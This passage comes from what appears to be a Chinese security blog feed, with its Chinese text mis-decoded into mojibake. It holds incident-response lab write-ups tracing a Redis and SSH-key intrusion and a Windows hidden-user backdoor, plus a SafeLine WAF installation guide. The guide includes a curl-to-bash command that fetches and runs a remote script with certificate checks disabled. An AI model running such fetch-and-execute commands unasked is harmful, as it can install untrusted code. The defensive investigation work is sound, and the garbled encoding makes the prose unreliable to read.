´è¡Œä¸º</p><p>å†æŸ¥çœ‹ç™»é™†æˆåŠŸçš„æ—¶é—´ï¼Œåœ¨<code>20:23:07</code>ï¼Œä½†æ˜¯å½“æˆ‘ä»¬æŸ¥è¯¢å¯†ç ç™»é™†æˆåŠŸçš„æ—¥å¿—å´æ²¡æœ‰è®°å½•</p><p><img src="/img/Emergency-Linux-web1/image-20240321141454943.png" alt="image-20240321141454943"></p><p>åœ¨<code>last</code>å‘½ä»¤ä¸‹ï¼Œä¹Ÿèƒ½çœ‹åˆ°è¯¥IP çš„æœ€åä¸€æ¬¡ç™»é™†æ—¶é—´ï¼Œè¯¥IPç”¨è™šæ‹Ÿç»ˆç«¯è¿›è¡Œäº†è¿œç¨‹ç™»é™†ï¼ŒæŒç»­æ—¶é—´2åˆ†é’Ÿ</p><p><img src="/img/Emergency-Linux-web1/image-20240321130543954.png" alt="image-20240321130543954"></p><h1 id="å…«ã€å‘½ä»¤æ›¿æ¢æ£€æŸ¥"><a href="#å…«ã€å‘½ä»¤æ›¿æ¢æ£€æŸ¥" class="headerlink" title="å…«ã€å‘½ä»¤æ›¿æ¢æ£€æŸ¥"></a>å…«ã€å‘½ä»¤æ›¿æ¢æ£€æŸ¥</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo $PATH</span><br><span class="line">rpm -Vf /usr/bin/*</span><br><span class="line"></span><br><span class="line">//ç»“æœè¯´æ˜</span><br><span class="line">#S å…³é”®å­—ä»£è¡¨æ–‡ä»¶å¤§å°å‘ç”Ÿäº†å˜åŒ–</span><br><span class="line">#5 å…³é”®å­—ä»£è¡¨æ–‡ä»¶çš„ md5 å€¼å‘ç”Ÿäº†å˜åŒ–</span><br><span class="line">#T ä»£è¡¨æ–‡ä»¶æ—¶é—´å‘ç”Ÿäº†å˜åŒ–</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web1/image-20240321132650212.png" alt="image-20240321132650212"></p><p><code>/etc/rc.d/rc.local</code>ä¹‹å‰å·²ç»åšè¿‡æ’æŸ¥ï¼Œé‚£ä¹ˆè¿™é‡Œåˆå‡ºç°äº†<code>/etc/redis.conf</code>æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯redis çš„é…ç½®æ–‡ä»¶ï¼Œè¿™ä¸ª<code>redis.conf</code>åº”è¯¥æ˜¯è¢«äººåŠ¨äº†æ‰‹è„šï¼Œç®€å•æŸ¥çœ‹ä¸‹ï¼Œå‘ç°ç¬¬ä¸‰ä¸ª<code>flag&#123;P@ssW0rd_redis&#125;</code></p><p><img src="/img/Emergency-Linux-web1/image-20240321144357100.png" alt="image-20240321144357100"></p><p>æŸ¥çœ‹æ˜¯å¦å­˜åœ¨redis æœªæˆæƒ</p><p><img src="/img/Emergency-Linux-web1/image-20240321132912907.png" alt="image-20240321132912907"></p><p>å¥½å¥½å¥½ï¼Œredis æœªæˆæƒè®¿é—®çš„æ¡ä»¶å…¨éƒ¨æ»¡è¶³ã€‚é‚£ä¹ˆæŸ¥çœ‹ä¸€ä¸‹è¯¥æ–‡ä»¶æœ€æ–°çš„æ”¹åŠ¨æ—¶é—´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start /etc/redis.conf </span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web1/image-20240321133049257.png" alt="image-20240321133049257"></p><p>ä¸‰æœˆ18æ—¥çš„<code>19:53:13</code>ï¼Œè¿™å°±å¾ˆå¥‡æ€ªäº†ï¼Œå› ä¸ºåœ¨æ—¥å¿—æ’æŸ¥ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“æ¶æ„IPè¿œç¨‹ç™»é™†çš„æ—¶é—´åœ¨<code>20:23:07</code>ï¼Œå°ç‹è¿™ä¼šå„¿ä¹°è¾£æ¡å»äº†ï¼Œç­‰ä»–å›æ¥é—®é—®ä»–ï¼Œæˆ‘ä»¬æ¥ç€å¾€ä¸‹æ’æŸ¥ã€‚</p><p>æŸ¥æ‰¾ä¸‹redis çš„æ—¥å¿—æ–‡ä»¶ç›¸å…³ä½ç½®<img src="/img/Emergency-Linux-web1/image-20240321140436679.png" alt="image-20240321140436679"></p><p>çœ‹æ—¥å¿—æ–‡ä»¶å†…å®¹å¹¶ç­›é€‰ä¸‹æ¶æ„IP<code>192.168.75.129</code><img src="/img/Emergency-Linux-web1/image-20240321140549510.png" alt="image-20240321140549510"></p><p>è¯¥æ¶æ„IPä»ä¸‰æœˆ18æ—¥<code>19:27:57</code>åˆ°<code>20:21:58</code>ä¸€ç›´å¯¹redis æœåŠ¡å‘èµ·è®¿é—®ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œä¸€ä¸ªredis æœªæˆæƒè®¿é—®çš„å±å®³æ˜¯ç›¸å½“å·¨å¤§çš„ï¼Œå¯ä»¥ç›´æ¥æ¤å…¥ç—…æ¯’æœ¨é©¬ç­‰æ–‡ä»¶</p><h1 id="ä¹ã€æº¯æºè¿½è¸ª"><a href="#ä¹ã€æº¯æºè¿½è¸ª" class="headerlink" title="ä¹ã€æº¯æºè¿½è¸ª"></a>ä¹ã€æº¯æºè¿½è¸ª</h1><p>æˆ‘ä»¬é€šè¿‡å¯¹linuxç™»å½•æ—¥å¿—åˆ†æï¼Œé»‘å®¢ä»ä¸‰æœˆ18æ—¥<code>19:29:43</code>å¼€å§‹è¿›è¡Œäº†sshçˆ†ç ´è¡Œä¸ºï¼ŒæŒç»­åˆ°<code>19:29:51</code></p><p>é€šè¿‡redis æ—¥å¿—åˆ†æï¼Œé»‘å®¢ä»ä¸‰æœˆ18æ—¥<code>19:27:57</code>é€šè¿‡redis æœªæˆæƒè®¿é—®æŒç»­åˆ°<code>20:21:58</code></p><p>åœ¨å¼‚å¸¸æ–‡ä»¶ä¸­å‘ç°ï¼Œrootè´¦æˆ·ä¸‹çš„<code>authorized_keys</code>å…¬é’¥æ˜¯3æœˆ18æ—¥<code>20:22:39</code>çš„æ—¶é—´è¢«æ”¹åŠ¨</p><p>åœ¨<code>20:23:07</code>ï¼Œé»‘å®¢é€šè¿‡sshç§é’¥é€šè¿‡è¿œç¨‹è™šæ‹Ÿç»ˆç«¯ç™»é™†ï¼ŒæŒç»­æ—¶é—´ä¸¤åˆ†é’Ÿ</p><p>æœ€åï¼Œé»‘å®¢é€šè¿‡å¯¹å¼€æœºå¯åŠ¨æ–‡ä»¶<code>/etc/rc.d/rc.local</code>åšäº†åé—¨ç»´æŒ</p>]]></content>
      
      
      <categories>
          
          <category> åº”æ€¥é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å…¥ä¾µæ’æŸ¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€WAFé˜²ç«å¢™ã€‘é›·æ± WAFé˜²ç«å¢™å®‰è£…å’Œä½¿ç”¨</title>
      <link href="/2024/03/15/Blue-Team-SafeLine-LeichiWAF/"/>
      <url>/2024/03/15/Blue-Team-SafeLine-LeichiWAF/</url>
      
        <content type="html"><![CDATA[<h1 id="é›·æ± WAFé˜²ç«å¢™çš„å®‰è£…å’Œä½¿ç”¨"><a href="#é›·æ± WAFé˜²ç«å¢™çš„å®‰è£…å’Œä½¿ç”¨" class="headerlink" title="é›·æ± WAFé˜²ç«å¢™çš„å®‰è£…å’Œä½¿ç”¨"></a>é›·æ± WAFé˜²ç«å¢™çš„å®‰è£…å’Œä½¿ç”¨</h1><h1 id="ä¸€ã€ç¯å¢ƒé…ç½®"><a href="#ä¸€ã€ç¯å¢ƒé…ç½®" class="headerlink" title="ä¸€ã€ç¯å¢ƒé…ç½®"></a>ä¸€ã€ç¯å¢ƒé…ç½®</h1><h2 id="1ã€Docker-ç¯å¢ƒ"><a href="#1ã€Docker-ç¯å¢ƒ" class="headerlink" title="1ã€Docker ç¯å¢ƒ"></a>1ã€Docker ç¯å¢ƒ</h2><p>å¸è½½æ—§ç‰ˆçš„docker</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo yum remove docker \</span><br><span class="line">               docker-client \</span><br><span class="line">               docker-client-latest \</span><br><span class="line">               docker-common \</span><br><span class="line">               docker-latest \</span><br><span class="line">               docker-latest-logrotate \</span><br><span class="line">               docker-logrotate \</span><br><span class="line">               docker-engine</span><br></pre></td></tr></table></figure><p>å®‰è£…ä¾èµ–åŒ…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install -y yum-utils \</span><br><span class="line">   device-mapper-persistent-data \</span><br><span class="line">   lvm2</span><br></pre></td></tr></table></figure><p>è®¾ç½®docker ä»“åº“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure><p>å®‰è£…docker</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure><p>å¯åŠ¨dockeræœåŠ¡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start docker</span><br></pre></td></tr></table></figure><p>éªŒè¯docker æ˜¯å¦å®‰è£…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker -v</span><br><span class="line"></span><br><span class="line">//è½¯ä»¶ä¾èµ–ï¼šDocker 20.10.14 ç‰ˆæœ¬ä»¥ä¸Š</span><br></pre></td></tr></table></figure><h2 id="2ã€Docker-Composeç¯å¢ƒ"><a href="#2ã€Docker-Composeç¯å¢ƒ" class="headerlink" title="2ã€Docker-Composeç¯å¢ƒ"></a>2ã€Docker-Composeç¯å¢ƒ</h2><p>æŸ¥çœ‹æœåŠ¡å™¨æ¶æ„ï¼Œä¸€èˆ¬éƒ½æ˜¯ <code>docker-compose-Linux-x86_64</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;docker-compose-`uname -s`-`uname -m`&quot;</span><br></pre></td></tr></table></figure><p>åˆ°å®˜ç½‘ä¸‹è½½æœ€æ–°ç‰ˆçš„docker-compose</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/docker/compose</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ åˆ°æœåŠ¡å™¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo mv docker-compose-Linux-x86_64 /usr/local/bin/docker-compose</span><br><span class="line">sudo chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><p>æ£€æŸ¥docker-composeæ˜¯å¦å®‰è£…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo docker-compose --version</span><br><span class="line"></span><br><span class="line">//è½¯ä»¶ä¾èµ–ï¼šDocker Compose 2.0.0 ç‰ˆæœ¬ä»¥ä¸Š</span><br></pre></td></tr></table></figure><h1 id="äºŒã€é›·æ± WAF-çš„å®‰è£…"><a href="#äºŒã€é›·æ± WAF-çš„å®‰è£…" class="headerlink" title="äºŒã€é›·æ± WAF çš„å®‰è£…"></a>äºŒã€é›·æ± WAF çš„å®‰è£…</h1><h2 id="1ã€åœ¨çº¿å®‰è£…"><a href="#1ã€åœ¨çº¿å®‰è£…" class="headerlink" title="1ã€åœ¨çº¿å®‰è£…"></a>1ã€åœ¨çº¿å®‰è£…</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &quot;$(curl -fsSLk https://waf-ce.chaitin.cn/release/latest/setup.sh)&quot;</span><br></pre></td></tr></table></figure><h2 id="2ã€ç¦»çº¿å®‰è£…"><a href="#2ã€ç¦»çº¿å®‰è£…" class="headerlink" title="2ã€ç¦»çº¿å®‰è£…"></a>2ã€ç¦»çº¿å®‰è£…</h2><p>ä¸‹è½½ <a href="https://demo.waf-ce.chaitin.cn/image.tar.gz">é›·æ± ç¤¾åŒºç‰ˆé•œåƒåŒ…</a> å¹¶ä¼ è¾“åˆ°éœ€è¦å®‰è£…é›·æ± çš„æœåŠ¡å™¨ä¸Šï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤åŠ è½½é•œåƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat image.tar.gz | gzip -d | docker load</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œä»¥ä¸‹å‘½ä»¤åˆ›å»ºå¹¶è¿›å…¥é›·æ± å®‰è£…ç›®å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p safeline  &amp;&amp;  cd safeline    # åˆ›å»º safeline ç›®å½•å¹¶ä¸”è¿›å…¥</span><br></pre></td></tr></table></figure><p><strong>ä¸‹è½½ <a href="https://waf-ce.chaitin.cn/release/latest/compose.yaml">ç¼–æ’è„šæœ¬</a> å¹¶ä¼ è¾“åˆ° safeline ç›®å½•ä¸­</strong></p><p>å¤åˆ¶æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œç”Ÿæˆé›·æ± è¿è¡Œæ‰€éœ€çš„ç›¸å…³ç¯å¢ƒå˜é‡ï¼ˆæ³¨æ„ï¼šä¸è¦ä¸€è¡Œä¸€è¡Œå¤åˆ¶ï¼Œä¸€æ¬¡æ€§å¤åˆ¶å…¨éƒ¨å‘½ä»¤åæ‰§è¡Œï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cat &gt;&gt; .env &lt;&lt;EOF</span><br><span class="line">SAFELINE_DIR=$(pwd)</span><br><span class="line">IMAGE_TAG=latest</span><br><span class="line">MGT_PORT=9443</span><br><span class="line">POSTGRES_PASSWORD=$(LC_ALL=C tr -dc A-Za-z0-9 &lt;/dev/urandom | head -c 32)</span><br><span class="line">SUBNET_PREFIX=172.22.222</span><br><span class="line">IMAGE_PREFIX=chaitin</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å¯åŠ¨é›·æ± </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure><h1 id="ä¸‰ã€é›·æ± WAF-çš„é…ç½®"><a href="#ä¸‰ã€é›·æ± WAF-çš„é…ç½®" class="headerlink" title="ä¸‰ã€é›·æ± WAF çš„é…ç½®"></a>ä¸‰ã€é›·æ± WAF çš„é…ç½®</h1><h2 id="1ã€ç™»é™†"><a href="#1ã€ç™»é™†" class="headerlink" title="1ã€ç™»é™†"></a>1ã€ç™»é™†</h2><p>åœ¨å®‰è£…å®Œæˆä¹‹åä¼šå‡ºç°è´¦å·å¯†ç ä»¥åŠç™»é™†åœ°å€</p><p>ç™»é™†åéœ€è¦ç»‘å®šä¸€ä¸ªåŠ¨æ€å£ä»¤ï¼Œéœ€è¦åœ¨æ‰‹æœºä¸Šä¸‹è½½ä¸€ä¸ªæ”¯æŒTOTPçš„è®¤è¯è½¯ä»¶</p><p>é€‰æ‹©ç¬¬ä¸€ä¸ªè…¾è®¯èº«ä»½éªŒè¯ï¼Œæ‰«ç ä¸‹è½½æ‰‹æœºç‰ˆï¼Œä¹‹åæ‰«ç è¾“å…¥åŠ¨æ€å£ä»¤å³å¯ç™»é™†æˆåŠŸ</p><p><img src="/img/Blue-Team-SafeLine-LeichiWAF/image-20240315204823155.png" alt="image-20240315204823155"></p><h2 id="2ã€é…ç½®ç«™ç‚¹"><a href="#2ã€é…ç½®ç«™ç‚¹" class="headerlink" title="2ã€é…ç½®ç«™ç‚¹"></a>2ã€é…ç½®ç«™ç‚¹</h2><p>å·¥ä½œåŸç†ï¼š<strong>è®©ç½‘ç«™æµé‡å…ˆæŠµè¾¾é›·æ± ï¼Œç»è¿‡é›·æ± æ£€æµ‹å’Œè¿‡æ»¤åï¼Œå†è½¬ç»™åŸæ¥çš„ç½‘ç«™ä¸šåŠ¡ã€‚</strong></p><p><img src="/img/Blue-Team-SafeLine-LeichiWAF/flow-f8fc68b957b3b02950d85ac9a18dcdc9.svg" alt="flow.png"></p><p>é…ç½®é˜²æŠ¤ç«™ç‚¹ï¼Œå¦‚æœä¸éœ€è¦SSLè¯ä¹¦ï¼Œåˆ™æŠŠSSLé€‰é¡¹å–æ¶ˆå‹¾é€‰å³å¯ï¼Œæˆ–è€…æŠŠ443ç«¯å£çš„é€‰é¡¹åˆ é™¤ï¼š</p><p><img src="/img/Blue-Team-SafeLine-LeichiWAF/image-20240315195713770.png" alt="image-20240315195713770"></p><p>ç»è¿‡æµ‹è¯•ï¼Œè¿™ä¸ªåœ°æ–¹æœ€å¥½å°†é›·æ± å’Œç½‘ç«™åˆ†å¼€ï¼Œæ”¾åœ¨ä¸¤ä¸ªæœåŠ¡å™¨ä¸Šï¼Œå› ä¸ºé›·æ± çš„ä»£ç†ç½‘ç«™é»˜è®¤å ç”¨80ç«¯å£ã€‚é…ç½®å®Œæˆåï¼Œè®¿é—®é›·æ± æœåŠ¡å™¨çš„80ç«¯å£ï¼Œå‡ºç°å’Œç½‘ç«™åŒæ ·çš„ç•Œé¢å³é…ç½®æˆåŠŸ</p><h2 id="3ã€WAFé˜²æŠ¤"><a href="#3ã€WAFé˜²æŠ¤" class="headerlink" title="3ã€WAFé˜²æŠ¤"></a>3ã€WAFé˜²æŠ¤</h2><p>æ²¡åŠ é˜²æŠ¤ï¼šå­˜åœ¨sqlæ³¨å…¥</p><p><img src="/img/Blue-Team-SafeLine-LeichiWAF/image-20240315200621139.png" alt="image-20240315200621139"></p><p>åŠ äº†é˜²æŠ¤ï¼šç›´æ¥æ‹¦æˆª</p><p><img src="/img/Blue-Team-SafeLine-LeichiWAF/image-20240315200738171.png" alt="image-20240315200738171"></p><p><img src="/img/Blue-Team-SafeLine-LeichiWAF/image-20240315200943569.png" alt="image-20240315200943569"></p><h1 id="å››ã€é›·æ± WAF-çš„ç›‘æµ‹"><a href="#å››ã€é›·æ± WAF-çš„ç›‘æµ‹" class="headerlink" title="å››ã€é›·æ± WAF çš„ç›‘æµ‹"></a>å››ã€é›·æ± WAF çš„ç›‘æµ‹</h1><h2 id="1ã€æ•°æ®ç»Ÿè®¡"><a href="#1ã€æ•°æ®ç»Ÿè®¡" class="headerlink" title="1ã€æ•°æ®ç»Ÿè®¡"></a>1ã€æ•°æ®ç»Ÿè®¡</h2><p>æŸ¥çœ‹æ•°æ®è¯·æ±‚æ•°æ®é‡ã€æ‹¦æˆªæ•°æ®IPç­‰</p><p><img src="/img/Blue-Team-SafeLine-LeichiWAF/image-20240315201207308.png" alt="image-20240315201207308"></p><h2 id="2ã€æ”»å‡»äº‹ä»¶"><a href="#2ã€æ”»å‡»äº‹ä»¶" class="headerlink" title="2ã€æ”»å‡»äº‹ä»¶"></a>2ã€æ”»å‡»äº‹ä»¶</h2><p><img src="/img/Blue-Team-SafeLine-LeichiWAF/image-20240315201347283.png" alt="image-20240315201347283"></p><h2 id="3ã€æ—¥å¿—åˆ†æ"><a href="#3ã€æ—¥å¿—åˆ†æ" class="headerlink" title="3ã€æ—¥å¿—åˆ†æ"></a>3ã€æ—¥å¿—åˆ†æ</h2><p><img src="/img/Blue-Team-SafeLine-LeichiWAF/image-20240315201630115.png" alt="image-20240315201630115"></p><p><img src="/img/Blue-Team-SafeLine-LeichiWAF/image-20240315202059418.png" alt="image-20240315202059418"></p><h2 id="4ã€é»‘ç™½åå•"><a href="#4ã€é»‘ç™½åå•" class="headerlink" title="4ã€é»‘ç™½åå•"></a>4ã€é»‘ç™½åå•</h2><p>æ–°ç‰ˆé›·æ± çš„é»‘ç™½åå•é…ç½®åœ¨ã€æ”»å‡»é˜²æŠ¤ã€‘çš„å³ä¸Šè§’çš„ã€é…ç½®ã€‘ä¸­è¿›è¡Œæ·»åŠ </p><p><img src="/img/Blue-Team-SafeLine-LeichiWAF/image-20240315202414389.png" alt="image-20240315202414389"></p><h2 id="5ã€é«˜é¢‘ç‡é˜²æŠ¤"><a href="#5ã€é«˜é¢‘ç‡é˜²æŠ¤" class="headerlink" title="5ã€é«˜é¢‘ç‡é˜²æŠ¤"></a>5ã€é«˜é¢‘ç‡é˜²æŠ¤</h2><p><img src="/img/Blue-Team-SafeLine-LeichiWAF/image-20240315202603665.png" alt="image-20240315202603665"></p>]]></content>
      
      
      <categories>
          
          <category> è“é˜Ÿåº”æ€¥ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WAFé˜²ç«å¢™ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€åº”æ€¥é¶åœºã€‘Win Server Web3å…¥ä¾µæ’æŸ¥</title>
      <link href="/2024/03/13/Emergency-WinServer-web3/"/>
      <url>/2024/03/13/Emergency-WinServer-web3/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows-Server-Web3å…¥ä¾µæ’æŸ¥"><a href="#Windows-Server-Web3å…¥ä¾µæ’æŸ¥" class="headerlink" title="Windows Server Web3å…¥ä¾µæ’æŸ¥"></a>Windows Server Web3å…¥ä¾µæ’æŸ¥</h1><p><strong>å‰æ™¯éœ€è¦ï¼š</strong>å°è‹•åœ¨çœæŠ¤å€¼å®ˆä¸­ï¼Œåœ¨çµæœºä¸€åŠ¨æƒ…å†µä¸‹æŠŠè®¾å¤‡åœæ‰äº†ï¼Œç”²æ–¹é—®ï¼šä¸ºä»€ä¹ˆè¦åœè®¾å¤‡ï¼Ÿå°è‹•è¯´ï¼šæˆ‘ç¬¬å…­æ„Ÿå‘Šè¯‰æˆ‘ï¼Œè¿™æœºå™¨å¯èƒ½è¢«é»‘äº†ã€‚</p><p>è¿™æ˜¯ä»–çš„æœåŠ¡å™¨ï¼Œè¯·ä½ æ‰¾å‡ºä»¥ä¸‹å†…å®¹ä½œä¸ºé€šå…³æ¡ä»¶ï¼š</p><ol><li>æ”»å‡»è€…çš„ä¸¤ä¸ªIPåœ°å€</li><li>éšè—ç”¨æˆ·åç§°</li><li>é»‘å®¢é—ç•™ä¸‹çš„flagã€3ä¸ªã€‘</li></ol><h1 id="ä¸€ã€ç¯å¢ƒé…ç½®"><a href="#ä¸€ã€ç¯å¢ƒé…ç½®" class="headerlink" title="ä¸€ã€ç¯å¢ƒé…ç½®"></a>ä¸€ã€ç¯å¢ƒé…ç½®</h1><p>åœ¨ç½‘ç›˜ä¸­ä¸‹è½½è¯¥é¶åœºï¼Œè§£å‹ååœ¨vmä¸­é€‰æ‹©ã€æ‰“å¼€ã€‘ï¼Œé€‰æ‹©å¯¹åº”çš„.ovf æ–‡ä»¶</p><p><img src="/img/Emergency-WinServer-web3/image-20240313134334425.png" alt="image-20240313134334425"></p><p>éšä¾¿è®¾ç½®ä¸€ä¸ªåç§°ï¼ŒæŒ‡å®šè·¯å¾„å³å¯</p><h1 id="äºŒã€åé—¨ç”¨æˆ·æ’æŸ¥"><a href="#äºŒã€åé—¨ç”¨æˆ·æ’æŸ¥" class="headerlink" title="äºŒã€åé—¨ç”¨æˆ·æ’æŸ¥"></a>äºŒã€åé—¨ç”¨æˆ·æ’æŸ¥</h1><h3 id="1ã€å‘½ä»¤ç®€å•çš„æ’æŸ¥"><a href="#1ã€å‘½ä»¤ç®€å•çš„æ’æŸ¥" class="headerlink" title="1ã€å‘½ä»¤ç®€å•çš„æ’æŸ¥"></a>1ã€å‘½ä»¤ç®€å•çš„æ’æŸ¥</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-WinServer-web3/image-20240313135600186.png" alt="image-20240313135600186"></p><h3 id="2ã€æ§åˆ¶é¢æ¿æ’æŸ¥"><a href="#2ã€æ§åˆ¶é¢æ¿æ’æŸ¥" class="headerlink" title="2ã€æ§åˆ¶é¢æ¿æ’æŸ¥"></a>2ã€æ§åˆ¶é¢æ¿æ’æŸ¥</h3><p><img src="/img/Emergency-WinServer-web3/image-20240313135718050.png" alt="image-20240313135718050"></p><p>å‘ç°éšè—ç”¨æˆ·<code>hack6618$</code></p><h3 id="3ã€æœ¬åœ°ç”¨æˆ·å’Œç»„ç®¡ç†æ’æŸ¥"><a href="#3ã€æœ¬åœ°ç”¨æˆ·å’Œç»„ç®¡ç†æ’æŸ¥" class="headerlink" title="3ã€æœ¬åœ°ç”¨æˆ·å’Œç»„ç®¡ç†æ’æŸ¥"></a>3ã€æœ¬åœ°ç”¨æˆ·å’Œç»„ç®¡ç†æ’æŸ¥</h3><p><img src="/img/Emergency-WinServer-web3/image-20240313135815442.png" alt="image-20240313135815442"></p><h3 id="4ã€æ³¨å†Œè¡¨æ’æŸ¥"><a href="#4ã€æ³¨å†Œè¡¨æ’æŸ¥" class="headerlink" title="4ã€æ³¨å†Œè¡¨æ’æŸ¥"></a>4ã€æ³¨å†Œè¡¨æ’æŸ¥</h3><p><img src="/img/Emergency-WinServer-web3/image-20240313135933026.png" alt="image-20240313135933026"></p><p>å¹¶æ— å…¶ä»–ç”¨æˆ·</p><h1 id="ä¸‰ã€ç«¯å£ã€è¿›ç¨‹æ’æŸ¥"><a href="#ä¸‰ã€ç«¯å£ã€è¿›ç¨‹æ’æŸ¥" class="headerlink" title="ä¸‰ã€ç«¯å£ã€è¿›ç¨‹æ’æŸ¥"></a>ä¸‰ã€ç«¯å£ã€è¿›ç¨‹æ’æŸ¥</h1><h3 id="1ã€ç«¯å£è¿æ¥ã€è¿›ç¨‹æ’æŸ¥"><a href="#1ã€ç«¯å£è¿æ¥ã€è¿›ç¨‹æ’æŸ¥" class="headerlink" title="1ã€ç«¯å£è¿æ¥ã€è¿›ç¨‹æ’æŸ¥"></a>1ã€ç«¯å£è¿æ¥ã€è¿›ç¨‹æ’æŸ¥</h3><p><img src="/img/Emergency-WinServer-web3/image-20240313140024490.png" alt="image-20240313140024490"></p><p>ä¸å¤šä¸ªIP çš„80ç«¯å£å¤„äºè¿æ¥å…³é—­çŠ¶æ€ï¼Œä¸<code>104.208.16.88</code>çš„443ç«¯å£å¤„äºè¿æ¥çŠ¶æ€</p><p><img src="/img/Emergency-WinServer-web3/image-20240313140805519.png" alt="image-20240313140805519"></p><p>æ¯éš”ä¸€æ®µæ—¶é—´è¿æ¥ä¼šå‘ç”Ÿå˜åŒ–</p><p>è¿™é‡Œæˆ‘ä»¬é‡‡ç”¨<code>tcpview64.exe</code>è¿™ä¸ªå·¥å…·ï¼Œæ¥ç›‘å¬â€å¿ƒè·³æ•°æ®åŒ…â€</p><p><img src="/img/Emergency-WinServer-web3/image-20240313141139099.png" alt="image-20240313141139099"></p><p>å¯ä»¥çœ‹åˆ°<code>111.6.232.54</code>ä¸<code>223.109.1.97</code>åœ¨è¿›è¡Œè¿æ¥ï¼Œè¿›ç¨‹å‡ä¸º<code>svchost.exe</code>ï¼Œç›´æ¥åˆ¤ä¸ºå¼‚å¸¸è¿æ¥</p><p>å¯ä»¥å³å‡»killæ‰è¿™ä¸¤ä¸ªè¿›ç¨‹</p><p><img src="/img/Emergency-WinServer-web3/image-20240313141505805.png" alt="image-20240313141505805"></p><h1 id="å››ã€è‡ªå¯åŠ¨åé—¨æ’æŸ¥"><a href="#å››ã€è‡ªå¯åŠ¨åé—¨æ’æŸ¥" class="headerlink" title="å››ã€è‡ªå¯åŠ¨åé—¨æ’æŸ¥"></a>å››ã€è‡ªå¯åŠ¨åé—¨æ’æŸ¥</h1><h3 id="1ã€è®¡åˆ’ä»»åŠ¡æ’æŸ¥"><a href="#1ã€è®¡åˆ’ä»»åŠ¡æ’æŸ¥" class="headerlink" title="1ã€è®¡åˆ’ä»»åŠ¡æ’æŸ¥"></a>1ã€è®¡åˆ’ä»»åŠ¡æ’æŸ¥</h3><p><img src="/img/Emergency-WinServer-web3/image-20240313141727140.png" alt="image-20240313141727140"></p><p>ä¸¤ä¸ªè®¡åˆ’ä»»åŠ¡å‡ç”±åé—¨ç”¨æˆ·<code>hack6618$</code>æ‰€åˆ›å»ºï¼Œä¸”å‘ç°<code>flag&#123;zgsfsys@sec&#125;</code></p><p><img src="/img/Emergency-WinServer-web3/image-20240313141914152.png" 